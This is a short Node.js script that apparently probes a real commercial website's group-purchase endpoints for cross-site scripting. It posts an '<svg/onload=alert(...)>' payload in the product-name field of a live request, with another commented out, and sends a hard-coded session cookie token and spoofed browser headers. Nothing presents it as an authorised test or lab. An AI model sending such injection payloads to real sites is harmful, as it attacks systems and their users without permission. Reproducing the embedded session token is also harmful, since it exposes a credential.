const axios=require('axios')


// axios.post('https://www.djcps.com/djgroupon/product/fuzzyQuery.do',{
//     'fgroupareaid':3311,
//     'fproductname': '<svg/onload=alert(1)>'
// },{
//     headers:{
//         'Referer': 'https://www.djcps.com/group/grouponHome.html',
//         'Cookie': 'token=WEB-f0147132-75b7-4ce5-a1b1-cf79fe47b73a',
//         'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'
//     }
// }).then(res=>{
//     console.log(res.data)
// }).catch(err=>{
//     console.log(err.data)
// })

axios.post('https://www.djcps.com/djgroupon/product/loadGrouponList.do',{
    'fflutetype':0,
    'fgroupareaid':3311,
    'fgrouptype': 0,
    'fkeyarea':'3311',
    'fproductname': '<svg/onload=alert(111111111)>',
    'limitbuildnumber':1,
    'systemplatform':3
},{
    headers:{
        'Referer': 'https://www.djcps.com/group/grouponHome.html',
        'Cookie': 'token=WEB-f0147132-75b7-4ce5-a1b1-cf79fe47b73a',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'
    }
}).then(res=>{
    console.log(res.data)
}).catch(err=>{
    console.log(err.data)
})